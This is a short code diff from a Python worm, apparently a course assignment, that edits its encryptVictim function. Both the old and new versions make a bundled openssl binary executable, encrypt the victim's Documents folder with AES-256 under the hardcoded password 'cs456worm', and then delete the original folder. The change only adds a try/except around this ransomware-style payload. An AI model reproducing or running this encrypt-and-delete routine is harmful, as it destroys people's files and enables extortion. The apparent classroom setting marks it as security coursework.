@@ -121,9 +121,12 @@ def attackHost(host):
 
 
 def encryptVictim():
-	call(["chmod", "a+x", "./openssl"])
-	call(["./openssl", "aes-256-cbc", "-a", "-salt", "-in", "/home/ubuntu/Documents", "-out", "/home/ubuntu/Documents.enc", "-k", "cs456worm"])
-	shutil.rmtree('/home/ubuntu/Documents/')
+	try:
+		call(["chmod", "a+x", "./openssl"])
+		call(["./openssl", "aes-256-cbc", "-a", "-salt", "-in", "/home/ubuntu/Documents", "-out", "/home/ubuntu/Documents.enc", "-k", "cs456worm"])
+		shutil.rmtree('/home/ubuntu/Documents/')
+	except:
+		print("Couldn't encypt victim")
 
 
 
